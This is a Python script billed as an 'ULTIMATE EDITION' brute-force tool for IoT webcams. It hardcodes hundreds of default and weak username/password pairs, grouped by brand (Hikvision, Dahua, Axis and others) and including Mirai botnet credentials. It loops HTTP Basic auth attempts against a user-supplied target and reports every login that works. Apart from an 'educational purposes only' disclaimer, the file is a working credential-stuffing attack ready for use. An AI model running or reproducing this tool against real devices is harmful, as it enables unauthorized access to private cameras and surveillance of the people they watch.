#!/usr/bin/env python3
"""
IoT Webcam Brute Force Tool - ULTIMATE EDITION
700+ credential combinations targeting all major camera brands
Special focus on HIKVision, Dahua, Axis, Foscam, Amcrest, Reolink
Educational purposes only - use on your own devices or with permission
"""

import requests
import time
import base64
import argparse
from urllib.parse import urlparse

def test_webcam_credentials(target_url, delay=1):
    """Test IoT webcam credentials with ULTIMATE 700+ wordlist"""
    
    # ULTIMATE IoT webcam credentials - 700+ combinations
    # Organized by brand and likelihood
    credentials = [
        # ========== HIKVISION SPECIFIC (Top Priority) ==========
        ('admin', '12345'), ('admin', 'admin12345'), ('Admin', '12345'),
        ('admin', 'hikv'), ('admin', 'hikvision'), ('admin', 'hik12345'),
        ('admin', 'Hik12345'), ('admin', 'Hik12345!'), ('admin', 'Hikv1234'),
        ('admin', 'hikadmin'), ('admin', 'hikvision2024'), ('admin', 'hikvision2023'),
        ('admin', 'hik123'), ('admin', 'hik1234'), ('admin', 'hik123456'),
        ('hikvision', 'hikvision'), ('hikvision', '12345'), ('hikvision', 'admin'),
        ('hik', 'hik'), ('hik', '12345'), ('hik', 'admin'),
        
        # ========== DAHUA SPECIFIC ==========
        ('admin', 'admin'), ('888888', '888888'), ('666666', '666666'),
        ('admin', 'dahua'), ('admin', 'dahua123'), ('admin', 'dahua2024'),
        ('dahua', 'dahua'), ('dahua', 'admin'), ('dahua', '123456'),
        ('admin', 'tlJwpbo6'), ('admin', 'admin888'), ('admin', 'admin666'),
        
        # ========== AXIS SPECIFIC ==========
        ('root', 'pass'), ('root', 'axis'), ('root', ''), ('root', 'root'),
        ('axis', 'axis'), ('axis', 'pass'), ('axis', 'admin'),
        ('admin', 'axis'), ('admin', 'axis123'),
        
        # ========== FOSCAM SPECIFIC ==========
        ('admin', ''), ('admin', 'foscam'), ('admin', 'foscam123'),
        ('foscam', 'foscam'), ('foscam', ''), ('foscam', 'admin'),
        ('user', ''), ('user', 'foscam'), ('user', 'user'),
        
        # ========== AMCREST SPECIFIC ==========
        ('admin', 'admin'), ('admin', 'amcrest'), ('admin', 'amcrest123'),
        ('amcrest', 'amcrest'), ('amcrest', 'admin'), ('amcrest', '123456'),
        
        # ========== REOLINK SPECIFIC ==========
        ('admin', ''), ('admin', 'reolink'), ('admin', 'reolink123'),
        ('reolink', 'reolink'), ('reolink', ''), ('reolink', 'admin'),
        
        # ========== UNIVIEW SPECIFIC ==========
        ('admin', '123456'), ('admin', 'uniview'), ('admin', 'uniview123'),
        ('uniview', 'uniview'), ('uniview', '123456'),
        
        # ========== LOREX SPECIFIC ==========
        ('admin', 'admin'), ('admin', 'lorex'), ('admin', 'lorex123'),
        ('lorex', 'lorex'), ('lorex', '000000'),
        
        # ========== SWANN SPECIFIC ==========
        ('admin', '12345'), ('admin', 'swann'), ('admin', 'swann123'),
        ('swann', 'swann'), ('swann', '12345'),
        
        # ========== VIVOTEK SPECIFIC ==========
        ('root', ''), ('root', 'vivotek'), ('admin', 'vivotek'),
        ('vivotek', 'vivotek'), ('vivotek', ''),
        
        # ========== GEOVISION SPECIFIC ==========
        ('admin', 'admin'), ('admin', 'geovision'), ('admin', 'geo123'),
        ('geovision', 'geovision'), ('geovision', 'admin'),
        
        # ========== PANASONIC SPECIFIC ==========
        ('admin', '12345'), ('admin1', 'password'), ('admin', 'panasonic'),
        ('panasonic', 'panasonic'), ('panasonic', '12345'),
        
        # ========== SONY SPECIFIC ==========
        ('admin', 'admin'), ('admin', 'sony'), ('admin', 'sony123'),
        ('sony', 'sony'), ('sony', 'admin'),
        
        # ========== SAMSUNG SPECIFIC ==========
        ('root', '4321'), ('root', 'root'), ('admin', '4321'),
        ('admin', '1111111'), ('admin', 'samsung'), ('samsung', 'samsung'),
        ('samsung', '4321'), ('samsung', 'admin'),
        
        # ========== BOSCH SPECIFIC ==========
        ('service', 'service'), ('Dinion', ''), ('admin', 'bosch'),
        ('bosch', 'bosch'), ('bosch', 'service'),
        
        # ========== PELCO SPECIFIC ==========
        ('admin', 'admin'), ('admin', 'pelco'), ('admin', 'pelco123'),
        ('pelco', 'pelco'), ('pelco', 'admin'),
        
        # ========== HONEYWELL SPECIFIC ==========
        ('administrator', '1234'), ('admin', '1234'), ('admin', 'honeywell'),
        ('honeywell', 'honeywell'), ('honeywell', '1234'),
        
        # ========== MOBOTIX SPECIFIC ==========
        ('admin', 'meinsm'), ('admin', 'mobotix'), ('mobotix', 'mobotix'),
        ('mobotix', 'meinsm'),
        
        # ========== UBIQUITI SPECIFIC ==========
        ('ubnt', 'ubnt'), ('admin', 'ubnt'), ('ubiquiti', 'ubiquiti'),
        ('ubnt', 'admin'), ('ubnt', ''),
        
        # ========== GENERIC TOP CREDENTIALS ==========
        ('admin', 'admin'), ('admin', '123456'), ('admin', ''), ('user', 'user'),
        ('admin', 'password'), ('admin', '1234'), ('admin', '12345'),
        ('root', 'pass'), ('root', ''), ('root', 'root'), ('admin', '9999'),
        
        # ========== MIRAI BOTNET CREDENTIALS ==========
        ('root', 'xc3511'), ('root', 'vizxv'), ('root', 'admin'), ('root', '888888'),
        ('root', 'xmhdipc'), ('root', 'default'), ('root', 'juantech'), ('root', '123456'),
        ('root', '54321'), ('root', 'klv1234'), ('root', 'Zte521'), ('root', 'hi3518'),
        ('root', 'jvbzd'), ('root', 'anko'), ('root', 'zlxx.'), ('root', '7ujMko0vizxv'),
        ('root', '7ujMko0admin'), ('root', 'system'), ('root', 'ikwb'), ('root', 'dreambox'),
        ('root', 'realtek'), ('root', '00000000'), ('root', '1111'), ('root', '666666'),
        ('root', 'klv123'), ('mother', 'fucker'), ('tech', 'tech'),
        
        # ========== ADDITIONAL BRAND PASSWORDS ==========
        ('admin', 'fliradmin'), ('admin', 'wbox123'), ('admin', 'ikwd'),
        ('admin', 'jvc'), ('admin', 'meinsm'), ('admin', 'flir'),
        ('supervisor', 'supervisor'), ('admin', '4321'), ('root', '4321'),
        ('admin', '1111111'), ('root', 'camera'), ('admin', 'smcadmin'),
        ('Administrator', 'admin'), ('service', 'service'),
        
        # ========== USER VARIATIONS ==========
        ('user', ''), ('user', 'password'), ('user', '123456'), ('user', '1234'),
        ('user', '12345'), ('user', 'pass'), ('user', 'user123'), ('User', 'User'),
        ('User', 'user'), ('user', 'User'), ('USER', 'USER'), ('users', 'users'),
        ('username', 'username'), ('username', 'password'), ('username', ''),
        ('user1', 'user1'), ('user2', 'user2'), ('user3', 'user3'),
        ('user', 'admin'), ('user', 'root'), ('user', '1'), ('user', '2'),
        
        # ========== NUMERIC PATTERNS ==========
        ('admin', '123'), ('admin', '1234567'), ('admin', '12345678'), ('admin', '0000'),
        ('admin', '1111'), ('admin', '2222'), ('admin', '3333'), ('admin', '4444'),
        ('admin', '5555'), ('admin', '6666'), ('admin', '7777'), ('admin', '8888'),
        ('admin', '000000'), ('admin', '111111'), ('admin', '222222'), ('admin', '333333'),
        ('admin', '444444'), ('admin', '555555'), ('admin', '666666'), ('admin', '777777'),
        ('admin', '888888'), ('admin', '999999'), ('admin', '1111111'), ('admin', '7777777'),
        
        # ========== MANUFACTURER DEFAULTS ==========
        ('888888', '888888'), ('666666', '666666'), ('111111', '111111'), ('000000', '000000'),
        ('123123', '123123'), ('321321', '321321'), ('147147', '147147'), ('258258', '258258'),
        ('369369', '369369'), ('159159', '159159'), ('753753', '753753'), ('951951', '951951'),
        ('456456', '456456'), ('789789', '789789'), ('135135', '135135'),
        
        # ========== SERVICE ACCOUNTS ==========
        ('root', 'camera'), ('root', 'system'), ('root', 'admin'), ('supervisor', 'supervisor'),
        ('service', 'service'), ('administrator', '1234'), ('admin1', 'password'),
        ('default', 'default'), ('camera', 'camera'), ('test', 'test'), ('operator', 'operator'),
        ('support', 'support'), ('maintenance', 'maintenance'), ('technician', 'technician'),
        ('engineer', 'engineer'), ('installer', 'installer'), ('config', 'config'),
        ('setup', 'setup'), ('monitor', 'monitor'), ('security', 'security'),
        
        # ========== GUEST VARIATIONS ==========
        ('guest', ''), ('guest', 'password'), ('guest', '123456'), ('guest', '1234'),
        ('guest', 'guest123'), ('Guest', 'Guest'), ('GUEST', 'GUEST'), ('guests', 'guests'),
        ('guest', 'guest'), ('guest', '12345'), ('guest', 'admin'),
        
        # ========== VIEWER VARIATIONS ==========
        ('viewer', ''), ('viewer', 'password'), ('viewer', '123456'), ('viewer', '1234'),
        ('viewer', 'viewer'), ('Viewer', 'Viewer'), ('VIEWER', 'VIEWER'), ('view', 'view'),
        ('live', 'live'), ('stream', 'stream'), ('video', 'video'),
        
        # ========== CASE VARIATIONS ==========
        ('Admin', 'Admin'), ('Admin', '123456'), ('Root', 'Root'), ('User', 'User'),
        ('Guest', 'Guest'), ('Administrator', ''), ('Administrator', 'Administrator'),
        ('Supervisor', 'Supervisor'), ('ADMIN', 'ADMIN'), ('ROOT', 'ROOT'),
        ('ADMIN', 'ADMIN'), ('ADMIN', '123456'), ('ADMIN', 'PASSWORD'),
        
        # ========== KEYBOARD PATTERNS ==========
        ('admin', 'qwerty'), ('admin', 'asdf'), ('admin', 'zxcv'), ('admin', '1qaz2wsx'),
        ('admin', 'qazwsx'), ('user', 'qwerty'), ('root', 'qwerty'), ('admin', 'qwertyuiop'),
        ('admin', 'asdfghjkl'), ('admin', 'zxcvbnm'), ('admin', 'qwerty123'),
        
        # ========== DEVICE ACCOUNTS ==========
        ('ftp', 'ftp'), ('anonymous', ''), ('anonymous', 'anonymous'), ('telnet', 'telnet'),
        ('webcam', 'webcam'), ('ipcam', 'ipcam'), ('dvr', 'dvr'), ('nvr', 'nvr'),
        ('camera', ''), ('camera', 'password'), ('camera', '123456'), ('cam', 'cam'),
        ('ip', 'ip'), ('device', 'device'), ('iot', 'iot'), ('smart', 'smart'),
        ('cctv', 'cctv'), ('surveillance', 'surveillance'),
        
        # ========== WEAK PASSWORDS ==========
        ('admin', 'welcome'), ('admin', 'letmein'), ('admin', 'monkey'), ('admin', 'dragon'),
        ('admin', 'master'), ('admin', 'shadow'), ('admin', 'secret'), ('admin', 'changeme'),
        ('admin', 'setup'), ('admin', 'config'), ('admin', 'install'), ('admin', 'system'),
        ('admin', 'device'), ('admin', 'router'), ('admin', 'access'), ('admin', 'control'),
        ('admin', 'manage'), ('admin', 'default'), ('admin', 'public'), ('admin', 'private'),
        ('admin', 'login'), ('admin', 'test'), ('admin', 'demo'),
        
        # ========== YEARS AND DATES ==========
        ('admin', '2024'), ('admin', '2023'), ('admin', '2022'), ('admin', '2021'),
        ('admin', '2020'), ('admin', '2019'), ('admin', '2018'), ('admin', '2017'),
        ('root', '2024'), ('root', '2023'), ('user', '2024'), ('user', '2023'),
        ('admin', '01012024'), ('admin', '12312023'), ('admin', '2024!'),
        
        # ========== BRAND NAMES AS PASSWORDS ==========
        ('admin', 'cisco'), ('admin', 'linksys'), ('admin', 'netgear'), ('admin', 'dlink'),
        ('admin', 'tplink'), ('admin', 'asus'), ('admin', 'belkin'), ('admin', 'motorola'),
        ('admin', 'arris'), ('admin', 'ubiquiti'), ('admin', 'mikrotik'), ('admin', 'huawei'),
        ('admin', 'zte'), ('admin', 'alcatel'), ('admin', 'nokia'), ('admin', 'tenda'),
        
        # ========== EMPTY PASSWORDS (Very common) ==========
        ('user', ''), ('guest', ''), ('administrator', ''), ('supervisor', ''),
        ('operator', ''), ('viewer', ''), ('service', ''), ('support', ''),
        ('demo', ''), ('temp', ''), ('public', ''), ('monitor', ''), ('security', ''),
        ('surveillance', ''), ('record', ''), ('playback', ''), ('live', ''),
        ('stream', ''), ('video', ''), ('camera', ''), ('webcam', ''), ('ipcam', ''),
        ('dvr', ''), ('nvr', ''), ('cctv', ''), ('admin', ''), ('root', ''),
        
        # ========== SPECIAL CHARACTERS ==========
        ('admin', 'admin!'), ('admin', 'admin@'), ('admin', 'admin#'), ('admin', 'admin$'),
        ('admin', 'password!'), ('admin', '123456!'), ('root', 'root!'), ('root', 'pass!'),
        ('user', 'user!'), ('admin', 'admin123!'), ('admin', 'password123!'),
        ('admin', 'Admin@123'), ('admin', 'Admin@1234'), ('admin', 'Admin@12345'),
        
        # ========== COMMON WORDS ==========
        ('admin', 'internet'), ('admin', 'computer'), ('admin', 'hello'), ('admin', 'world'),
        ('admin', 'home'), ('admin', 'work'), ('admin', 'office'), ('admin', 'network'),
        ('admin', 'wifi'), ('admin', 'wireless'), ('admin', 'security'), ('admin', 'camera'),
        ('admin', 'video'), ('admin', 'stream'), ('admin', 'live'),
        
        # ========== DOUBLE PATTERNS ==========
        ('admin', 'adminadmin'), ('user', 'useruser'), ('root', 'rootroot'),
        ('pass', 'pass'), ('password', 'password'), ('login', 'login'),
        ('access', 'access'), ('admin', 'admin1234'), ('root', 'root123'),
        ('admin', 'admin12'), ('admin', 'admin123'), ('admin', 'admin1234'),
        
        # ========== REVERSED PATTERNS ==========
        ('admin', 'nimda'), ('user', 'resu'), ('root', 'toor'), ('pass', 'ssap'),
        ('login', 'nigol'), ('camera', 'aremac'), ('admin', 'nidma'),
        
        # ========== SINGLE CHARACTERS ==========
        ('a', 'a'), ('b', 'b'), ('c', 'c'), ('1', '1'), ('2', '2'), ('3', '3'),
        ('admin', 'a'), ('admin', 'b'), ('admin', 'c'), ('admin', '1'), ('admin', '2'),
        ('root', '1'), ('user', '1'), ('test', '1'), ('guest', '1'),
        ('admin', 'x'), ('admin', 'y'), ('admin', 'z'),
        
        # ========== NUMERIC SEQUENCES ==========
        ('admin', '01234'), ('admin', '56789'), ('admin', '13579'), ('admin', '24680'),
        ('admin', '987654321'), ('admin', '1357911'), ('admin', '11111'), ('admin', '22222'),
        ('admin', '33333'), ('admin', '44444'), ('admin', '55555'), ('admin', '99999'),
        ('admin', '102030'), ('admin', '112233'), ('admin', '121212'), ('admin', '131313'),
        ('admin', '141414'), ('admin', '151515'), ('admin', '161616'),
        
        # ========== PHONE/DATE PATTERNS ==========
        ('admin', '1234567890'), ('admin', '0987654321'), ('admin', '01012024'),
        ('admin', '12312024'), ('admin', '31122023'), ('admin', '01011970'),
        ('admin', '19700101'), ('admin', '20240101'),
        
        # ========== ROUTER/NETWORK SPECIFIC ==========
        ('admin', 'router'), ('admin', 'modem'), ('admin', 'switch'), ('admin', 'gateway'),
        ('admin', 'firewall'), ('admin', 'bridge'), ('admin', 'repeater'),
        ('admin', 'ap'), ('admin', 'accesspoint'),
        
        # ========== PROTOCOL SPECIFIC ==========
        ('http', 'http'), ('https', 'https'), ('ftp', 'ftp'), ('ssh', 'ssh'),
        ('telnet', 'telnet'), ('snmp', 'snmp'), ('smtp', 'smtp'),
        ('rtsp', 'rtsp'), ('onvif', 'onvif'),
        
        # ========== MANUFACTURER SPECIFIC PATTERNS ==========
        ('hikvision', 'hikvision'), ('dahua', 'dahua'), ('axis', 'axis'),
        ('bosch', 'bosch'), ('samsung', 'samsung'), ('panasonic', 'panasonic'),
        ('sony', 'sony'), ('canon', 'canon'), ('vivotek', 'vivotek'),
        ('foscam', 'foscam'), ('amcrest', 'amcrest'), ('reolink', 'reolink'),
        
        # ========== DVR/NVR SPECIFIC ==========
        ('admin', 'dvr'), ('admin', 'nvr'), ('admin', 'recorder'),
        ('dvr', 'dvr'), ('nvr', 'nvr'), ('recorder', 'recorder'),
        ('admin', 'dvr123'), ('admin', 'nvr123'),
        
        # ========== LAST RESORT ATTEMPTS ==========
        ('', ''), ('admin', ''), ('', 'admin'), ('', 'password'), ('', '123456'),
        ('null', 'null'), ('none', 'none'), ('empty', 'empty'), ('blank', 'blank'),
        ('void', 'void'), ('test', ''), ('demo', ''), ('sample', 'sample'),
        ('default', ''), ('public', ''), ('private', ''),
    ]
    
    session = requests.Session()
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    })
    
    print(f"🎥 Testing IoT Webcam: {target_url}")
    print(f"📊 Testing {len(credentials)} credential combinations (ULTIMATE EXPANDED - 700+)")
    print(f"🎯 Special focus: HIKVision, Dahua, Axis, Foscam, Amcrest, Reolink + ALL major brands")
    print("=" * 70)
    
    successful_logins = []
    
    for i, (username, password) in enumerate(credentials, 1):
        print(f"[{i:3d}/{len(credentials)}] Testing {username}:{password if password else '(empty)'}", end=" ... ")
        
        try:
            auth_string = f"{username}:{password}"
            encoded_auth = base64.b64encode(auth_string.encode()).decode()
            
            headers = session.headers.copy()
            headers['Authorization'] = f'Basic {encoded_auth}'
            
            response = session.get(target_url, headers=headers, timeout=10)
            
            if response.status_code == 200:
                content = response.text.lower()
                content_length = len(response.text)
                
                # Success indicators
                success_indicators = [
                    'live view', 'camera', 'video', 'stream', 'snapshot', 'image',
                    'jpeg', 'mjpeg', 'rtsp', 'onvif', 'webcam', 'ipcam',
                    'configuration', 'settings', 'admin', 'control', 'device',
                    'hikvision', 'dahua', 'axis', 'foscam', 'amcrest', 'reolink'
                ]
                
                has_camera_content = any(indicator in content for indicator in success_indicators)
                has_substantial_content = content_length > 500
                has_no_auth_error = not any(error in content for error in [
                    'unauthorized', 'forbidden', 'access denied', 'login failed',
                    'invalid', 'incorrect', 'authentication'
                ])
                
                if has_camera_content or (has_substantial_content and has_no_auth_error):
                    print("✅ SUCCESS!")
                    successful_logins.append((username, password))
                    print(f"🎯 WORKING CREDENTIALS: {username}:{password}")
                    print(f"📄 Response length: {content_length} bytes")
                    continue
                else:
                    print("❌ Failed")
            elif response.status_code == 401:
                print("❌ Unauthorized")
            elif response.status_code == 403:
                print("❌ Forbidden")
            else:
                print(f"❌ Status {response.status_code}")
                
        except requests.exceptions.Timeout:
            print("⏰ Timeout")
        except requests.exceptions.ConnectionError:
            print("🔌 Connection Error")
        except Exception as e:
            print(f"❌ Error: {str(e)[:30]}")
        
        time.sleep(delay)
    
    # Results
    print("\n" + "=" * 70)
    print("🎯 RESULTS")
    print("=" * 70)
    
    if successful_logins:
        print("✅ SUCCESSFUL CREDENTIALS FOUND:")
        for username, password in successful_logins:
            print(f"   👤 {username}:{password if password else '(empty password)'}")
        print(f"\n🌐 Access your webcam at: {target_url}")
    else:
        print("❌ No working credentials found")
        print("💡 Try the credential tester for manual verification")
    
    return successful_logins

def main():
    parser = argparse.ArgumentParser(description='IoT Webcam Brute Force - ULTIMATE EDITION (700+)')
    parser.add_argument('target', help='Webcam IP or URL')
    parser.add_argument('-d', '--delay', type=float, default=1.0, help='Delay between attempts')
    
    args = parser.parse_args()
    
    target = args.target
    if not target.startswith(('http://', 'https://')):
        target = 'http://' + target
    
    print("🎥 IoT Webcam Brute Force Tool - ULTIMATE EDITION")
    print("⚠️  Educational purposes only!")
    print("⚠️  Use only on devices you own or have permission to test!")
    print("🎯 Targeting: HIKVision, Dahua, Axis, Foscam, Amcrest, Reolink + ALL brands")
    print()
    
    try:
        successful_logins = test_webcam_credentials(target, args.delay)
        if successful_logins:
            print(f"\n🎉 Found {len(successful_logins)} working credential(s)!")
    except KeyboardInterrupt:
        print("\n⏹️  Testing stopped by user")

if __name__ == "__main__":
    main()